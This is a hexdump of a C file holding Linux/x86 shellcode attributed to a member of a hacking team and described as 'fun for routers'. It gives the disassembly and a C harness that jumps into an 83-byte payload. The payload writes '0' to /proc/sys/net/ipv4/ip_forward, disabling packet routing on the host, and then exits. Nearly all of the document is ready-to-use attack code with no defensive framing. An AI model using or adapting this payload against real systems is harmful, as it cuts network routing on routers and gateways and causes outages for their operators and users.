00000000  2f 2a 0a 20 20 20 20 49  6e 20 54 68 65 20 4e 61  |/*.    In The Na|
00000010  6d 65 20 6f 66 20 47 30  44 0a 20 20 20 20 0a 20  |me of G0D.    . |
00000020  20 20 20 4c 69 6e 75 78  2f 78 38 36 20 2d 20 53  |   Linux/x86 - S|
00000030  65 74 20 27 2f 70 72 6f  63 2f 73 79 73 2f 6e 65  |et '/proc/sys/ne|
00000040  74 2f 69 70 76 34 2f 69  70 5f 66 6f 72 77 61 72  |t/ipv4/ip_forwar|
00000050  64 27 20 74 6f 20 27 30  27 20 26 20 65 78 69 74  |d' to '0' & exit|
00000060  28 29 20 0a 20 20 20 20  53 69 7a 65 20 3a 20 38  |() .    Size : 8|
00000070  33 20 42 79 74 65 73 0a  20 20 20 20 0a 20 20 20  |3 Bytes.    .   |
00000080  20 66 75 6e 20 66 6f 72  20 72 6f 75 74 65 72 73  | fun for routers|
00000090  20 3b 29 0a 20 20 20 20  0a 20 20 20 20 41 75 74  | ;).    .    Aut|
000000a0  68 6f 72 20 3a 20 42 79  20 48 61 6d 69 64 20 5a  |hor : By Hamid Z|
000000b0  61 6d 61 6e 69 20 28 61  6b 61 20 48 41 4d 49 44  |amani (aka HAMID|
000000c0  78 39 29 0a 20 20 20 20  4d 65 6d 62 65 72 20 6f  |x9).    Member o|
000000d0  66 20 5e 5e 41 73 68 69  79 61 6e 65 20 44 69 67  |f ^^Ashiyane Dig|
000000e0  69 74 61 6c 20 53 65 63  75 72 69 74 79 20 54 65  |ital Security Te|
000000f0  61 6d 5e 5e 0a 20 20 20  20 0a 0a 44 69 73 61 73  |am^^.    ..Disas|
00000100  73 65 6d 62 6c 79 20 6f  66 20 73 65 63 74 69 6f  |sembly of sectio|
00000110  6e 20 2e 74 65 78 74 3a  0a 0a 30 38 30 34 38 30  |n .text:..080480|
00000120  35 34 20 3c 5f 73 74 61  72 74 3e 3a 0a 20 38 30  |54 <_start>:. 80|
00000130  34 38 30 35 34 3a 20 20  20 33 31 20 63 30 20 20  |48054:   31 c0  |
00000140  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000150  20 78 6f 72 20 20 20 20  25 65 61 78 2c 25 65 61  | xor    %eax,%ea|
00000160  78 0a 20 38 30 34 38 30  35 36 3a 20 20 20 35 30  |x. 8048056:   50|
00000170  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000180  20 20 20 20 20 20 70 75  73 68 20 20 20 25 65 61  |      push   %ea|
00000190  78 0a 20 38 30 34 38 30  35 37 3a 20 20 20 36 38  |x. 8048057:   68|
000001a0  20 37 37 20 36 31 20 37  32 20 36 34 20 20 20 20  | 77 61 72 64    |
000001b0  20 20 20 20 20 20 70 75  73 68 20 20 20 24 30 78  |      push   $0x|
000001c0  36 34 37 32 36 31 37 37  0a 20 38 30 34 38 30 35  |64726177. 804805|
000001d0  63 3a 20 20 20 36 38 20  35 66 20 36 36 20 36 66  |c:   68 5f 66 6f|
000001e0  20 37 32 20 20 20 20 20  20 20 20 20 20 70 75 73  | 72          pus|
000001f0  68 20 20 20 24 30 78 37  32 36 66 36 36 35 66 0a  |h   $0x726f665f.|
00000200  20 38 30 34 38 30 36 31  3a 20 20 20 36 38 20 33  | 8048061:   68 3|
00000210  34 20 32 66 20 36 39 20  37 30 20 20 20 20 20 20  |4 2f 69 70      |
00000220  20 20 20 20 70 75 73 68  20 20 20 24 30 78 37 30  |    push   $0x70|
00000230  36 39 32 66 33 34 0a 20  38 30 34 38 30 36 36 3a  |692f34. 8048066:|
00000240  20 20 20 36 38 20 32 66  20 36 39 20 37 30 20 37  |   68 2f 69 70 7|
00000250  36 20 20 20 20 20 20 20  20 20 20 70 75 73 68 20  |6          push |
00000260  20 20 24 30 78 37 36 37  30 36 39 32 66 0a 20 38  |  $0x7670692f. 8|
00000270  30 34 38 30 36 62 3a 20  20 20 36 38 20 32 66 20  |04806b:   68 2f |
00000280  36 65 20 36 35 20 37 34  20 20 20 20 20 20 20 20  |6e 65 74        |
00000290  20 20 70 75 73 68 20 20  20 24 30 78 37 34 36 35  |  push   $0x7465|
000002a0  36 65 32 66 0a 20 38 30  34 38 30 37 30 3a 20 20  |6e2f. 8048070:  |
000002b0  20 36 38 20 37 33 20 37  39 20 37 33 20 32 66 20  | 68 73 79 73 2f |
000002c0  20 20 20 20 20 20 20 20  20 70 75 73 68 20 20 20  |         push   |
000002d0  24 30 78 32 66 37 33 37  39 37 33 0a 20 38 30 34  |$0x2f737973. 804|
000002e0  38 30 37 35 3a 20 20 20  36 38 20 37 32 20 36 66  |8075:   68 72 6f|
000002f0  20 36 33 20 32 66 20 20  20 20 20 20 20 20 20 20  | 63 2f          |
00000300  70 75 73 68 20 20 20 24  30 78 32 66 36 33 36 66  |push   $0x2f636f|
00000310  37 32 0a 20 38 30 34 38  30 37 61 3a 20 20 20 36  |72. 804807a:   6|
00000320  36 20 36 38 20 32 66 20  37 30 20 20 20 20 20 20  |6 68 2f 70      |
00000330  20 20 20 20 20 20 20 70  75 73 68 77 20 20 24 30  |       pushw  $0|
00000340  78 37 30 32 66 0a 20 38  30 34 38 30 37 65 3a 20  |x702f. 804807e: |
00000350  20 20 38 39 20 65 33 20  20 20 20 20 20 20 20 20  |  89 e3         |
00000360  20 20 20 20 20 20 20 20  20 20 6d 6f 76 20 20 20  |          mov   |
00000370  20 25 65 73 70 2c 25 65  62 78 0a 20 38 30 34 38  | %esp,%ebx. 8048|
00000380  30 38 30 3a 20 20 20 33  31 20 63 39 20 20 20 20  |080:   31 c9    |
00000390  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 78  |               x|
000003a0  6f 72 20 20 20 20 25 65  63 78 2c 25 65 63 78 0a  |or    %ecx,%ecx.|
000003b0  20 38 30 34 38 30 38 32  3a 20 20 20 62 31 20 30  | 8048082:   b1 0|
000003c0  31 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1               |
000003d0  20 20 20 20 6d 6f 76 20  20 20 20 24 30 78 31 2c  |    mov    $0x1,|
000003e0  25 63 6c 0a 20 38 30 34  38 30 38 34 3a 20 20 20  |%cl. 8048084:   |
000003f0  62 30 20 30 35 20 20 20  20 20 20 20 20 20 20 20  |b0 05           |
00000400  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 24  |        mov    $|
00000410  30 78 35 2c 25 61 6c 0a  20 38 30 34 38 30 38 36  |0x5,%al. 8048086|
00000420  3a 20 20 20 63 64 20 38  30 20 20 20 20 20 20 20  |:   cd 80       |
00000430  20 20 20 20 20 20 20 20  20 20 20 20 69 6e 74 20  |            int |
00000440  20 20 20 24 30 78 38 30  0a 20 38 30 34 38 30 38  |   $0x80. 804808|
00000450  38 3a 20 20 20 38 39 20  63 33 20 20 20 20 20 20  |8:   89 c3      |
00000460  20 20 20 20 20 20 20 20  20 20 20 20 20 6d 6f 76  |             mov|
00000470  20 20 20 20 25 65 61 78  2c 25 65 62 78 0a 20 38  |    %eax,%ebx. 8|
00000480  30 34 38 30 38 61 3a 20  20 20 33 31 20 63 39 20  |04808a:   31 c9 |
00000490  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000004a0  20 20 78 6f 72 20 20 20  20 25 65 63 78 2c 25 65  |  xor    %ecx,%e|
000004b0  63 78 0a 20 38 30 34 38  30 38 63 3a 20 20 20 35  |cx. 804808c:   5|
000004c0  31 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |1               |
000004d0  20 20 20 20 20 20 20 70  75 73 68 20 20 20 25 65  |       push   %e|
000004e0  63 78 0a 20 38 30 34 38  30 38 64 3a 20 20 20 36  |cx. 804808d:   6|
000004f0  61 20 33 30 20 20 20 20  20 20 20 20 20 20 20 20  |a 30            |
00000500  20 20 20 20 20 20 20 70  75 73 68 20 20 20 24 30  |       push   $0|
00000510  78 33 30 0a 20 38 30 34  38 30 38 66 3a 20 20 20  |x30. 804808f:   |
00000520  38 39 20 65 31 20 20 20  20 20 20 20 20 20 20 20  |89 e1           |
00000530  20 20 20 20 20 20 20 20  6d 6f 76 20 20 20 20 25  |        mov    %|
00000540  65 73 70 2c 25 65 63 78  0a 20 38 30 34 38 30 39  |esp,%ecx. 804809|
00000550  31 3a 20 20 20 33 31 20  64 32 20 20 20 20 20 20  |1:   31 d2      |
00000560  20 20 20 20 20 20 20 20  20 20 20 20 20 78 6f 72  |             xor|
00000570  20 20 20 20 25 65 64 78  2c 25 65 64 78 0a 20 38  |    %edx,%edx. 8|
00000580  30 34 38 30 39 33 3a 20  20 20 62 32 20 30 31 20  |048093:   b2 01 |
00000590  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000005a0  20 20 6d 6f 76 20 20 20  20 24 30 78 31 2c 25 64  |  mov    $0x1,%d|
000005b0  6c 0a 20 38 30 34 38 30  39 35 3a 20 20 20 62 30  |l. 8048095:   b0|
000005c0  20 30 34 20 20 20 20 20  20 20 20 20 20 20 20 20  | 04             |
000005d0  20 20 20 20 20 20 6d 6f  76 20 20 20 20 24 30 78  |      mov    $0x|
000005e0  34 2c 25 61 6c 0a 20 38  30 34 38 30 39 37 3a 20  |4,%al. 8048097: |
000005f0  20 20 63 64 20 38 30 20  20 20 20 20 20 20 20 20  |  cd 80         |
00000600  20 20 20 20 20 20 20 20  20 20 69 6e 74 20 20 20  |          int   |
00000610  20 24 30 78 38 30 0a 20  38 30 34 38 30 39 39 3a  | $0x80. 8048099:|
00000620  20 20 20 33 31 20 63 30  20 20 20 20 20 20 20 20  |   31 c0        |
00000630  20 20 20 20 20 20 20 20  20 20 20 78 6f 72 20 20  |           xor  |
00000640  20 20 25 65 61 78 2c 25  65 61 78 0a 20 38 30 34  |  %eax,%eax. 804|
00000650  38 30 39 62 3a 20 20 20  38 33 20 63 30 20 30 36  |809b:   83 c0 06|
00000660  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000670  61 64 64 20 20 20 20 24  30 78 36 2c 25 65 61 78  |add    $0x6,%eax|
00000680  0a 20 38 30 34 38 30 39  65 3a 20 20 20 63 64 20  |. 804809e:   cd |
00000690  38 30 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |80              |
000006a0  20 20 20 20 20 69 6e 74  20 20 20 20 24 30 78 38  |     int    $0x8|
000006b0  30 0a 20 38 30 34 38 30  61 30 3a 20 20 20 33 31  |0. 80480a0:   31|
000006c0  20 63 30 20 20 20 20 20  20 20 20 20 20 20 20 20  | c0             |
000006d0  20 20 20 20 20 20 78 6f  72 20 20 20 20 25 65 61  |      xor    %ea|
000006e0  78 2c 25 65 61 78 0a 20  38 30 34 38 30 61 32 3a  |x,%eax. 80480a2:|
000006f0  20 20 20 34 30 20 20 20  20 20 20 20 20 20 20 20  |   40           |
00000700  20 20 20 20 20 20 20 20  20 20 20 69 6e 63 20 20  |           inc  |
00000710  20 20 25 65 61 78 0a 20  38 30 34 38 30 61 33 3a  |  %eax. 80480a3:|
00000720  20 20 20 33 31 20 64 62  20 20 20 20 20 20 20 20  |   31 db        |
00000730  20 20 20 20 20 20 20 20  20 20 20 78 6f 72 20 20  |           xor  |
00000740  20 20 25 65 62 78 2c 25  65 62 78 0a 20 38 30 34  |  %ebx,%ebx. 804|
00000750  38 30 61 35 3a 20 20 20  63 64 20 38 30 20 20 20  |80a5:   cd 80   |
00000760  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000770  69 6e 74 20 20 20 20 24  30 78 38 30 0a 2a 2f 0a  |int    $0x80.*/.|
00000780  0a 23 69 6e 63 6c 75 64  65 20 3c 73 74 64 69 6f  |.#include <stdio|
00000790  2e 68 3e 0a 0a 69 6e 74  20 6d 61 69 6e 28 69 6e  |.h>..int main(in|
000007a0  74 20 61 72 67 63 2c 63  68 61 72 20 2a 2a 61 72  |t argc,char **ar|
000007b0  67 76 29 0a 7b 0a 0a 63  68 61 72 20 73 68 65 6c  |gv).{..char shel|
000007c0  6c 63 6f 64 65 5b 5d 20  3d 20 22 5c 78 33 31 5c  |lcode[] = "\x31\|
000007d0  78 63 30 5c 78 35 30 5c  78 36 38 5c 78 37 37 5c  |xc0\x50\x68\x77\|
000007e0  78 36 31 5c 78 37 32 5c  78 36 34 5c 78 36 38 22  |x61\x72\x64\x68"|
000007f0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
00000800  20 20 20 20 22 5c 78 35  66 5c 78 36 36 5c 78 36  |    "\x5f\x66\x6|
00000810  66 5c 78 37 32 5c 78 36  38 5c 78 33 34 5c 78 32  |f\x72\x68\x34\x2|
00000820  66 5c 78 36 39 5c 78 37  30 22 0a 20 20 20 20 20  |f\x69\x70".     |
00000830  20 20 20 20 20 20 20 20  20 20 20 20 20 20 22 5c  |              "\|
00000840  78 36 38 5c 78 32 66 5c  78 36 39 5c 78 37 30 5c  |x68\x2f\x69\x70\|
00000850  78 37 36 5c 78 36 38 5c  78 32 66 5c 78 36 65 5c  |x76\x68\x2f\x6e\|
00000860  78 36 35 22 0a 20 20 20  20 20 20 20 20 20 20 20  |x65".           |
00000870  20 20 20 20 20 20 20 20  22 5c 78 37 34 5c 78 36  |        "\x74\x6|
00000880  38 5c 78 37 33 5c 78 37  39 5c 78 37 33 5c 78 32  |8\x73\x79\x73\x2|
00000890  66 5c 78 36 38 5c 78 37  32 5c 78 36 66 22 0a 20  |f\x68\x72\x6f". |
000008a0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000008b0  20 20 22 5c 78 36 33 5c  78 32 66 5c 78 36 36 5c  |  "\x63\x2f\x66\|
000008c0  78 36 38 5c 78 32 66 5c  78 37 30 5c 78 38 39 5c  |x68\x2f\x70\x89\|
000008d0  78 65 33 5c 78 33 31 22  0a 20 20 20 20 20 20 20  |xe3\x31".       |
000008e0  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 63  |            "\xc|
000008f0  39 5c 78 62 31 5c 78 30  31 5c 78 62 30 5c 78 30  |9\xb1\x01\xb0\x0|
00000900  35 5c 78 63 64 5c 78 38  30 5c 78 38 39 5c 78 63  |5\xcd\x80\x89\xc|
00000910  33 22 0a 20 20 20 20 20  20 20 20 20 20 20 20 20  |3".             |
00000920  20 20 20 20 20 20 22 5c  78 33 31 5c 78 63 39 5c  |      "\x31\xc9\|
00000930  78 35 31 5c 78 36 61 5c  78 33 30 5c 78 38 39 5c  |x51\x6a\x30\x89\|
00000940  78 65 31 5c 78 33 31 5c  78 64 32 22 0a 20 20 20  |xe1\x31\xd2".   |
00000950  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000960  22 5c 78 62 32 5c 78 30  31 5c 78 62 30 5c 78 30  |"\xb2\x01\xb0\x0|
00000970  34 5c 78 63 64 5c 78 38  30 5c 78 33 31 5c 78 63  |4\xcd\x80\x31\xc|
00000980  30 5c 78 38 33 22 0a 20  20 20 20 20 20 20 20 20  |0\x83".         |
00000990  20 20 20 20 20 20 20 20  20 20 22 5c 78 63 30 5c  |          "\xc0\|
000009a0  78 30 36 5c 78 63 64 5c  78 38 30 5c 78 33 31 5c  |x06\xcd\x80\x31\|
000009b0  78 63 30 5c 78 34 30 5c  78 33 31 5c 78 64 62 22  |xc0\x40\x31\xdb"|
000009c0  0a 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |.               |
000009d0  20 20 20 20 22 5c 78 63  64 5c 78 38 30 22 3b 0a  |    "\xcd\x80";.|
000009e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000009f0  20 20 20 0a 20 20 20 20  20 70 72 69 6e 74 66 28  |   .     printf(|
00000a00  22 4c 65 6e 67 74 68 3a  20 25 64 5c 6e 22 2c 73  |"Length: %d\n",s|
00000a10  74 72 6c 65 6e 28 73 68  65 6c 6c 63 6f 64 65 29  |trlen(shellcode)|
00000a20  29 3b 0a 20 20 20 20 20  28 2a 28 76 6f 69 64 28  |);.     (*(void(|
00000a30  2a 29 28 29 29 20 73 68  65 6c 6c 63 6f 64 65 29  |*)()) shellcode)|
00000a40  28 29 3b 0a 20 20 20 20  20 0a 20 20 20 20 20 72  |();.     .     r|
00000a50  65 74 75 72 6e 20 30 3b  0a 7d                    |eturn 0;.}|
00000a5a
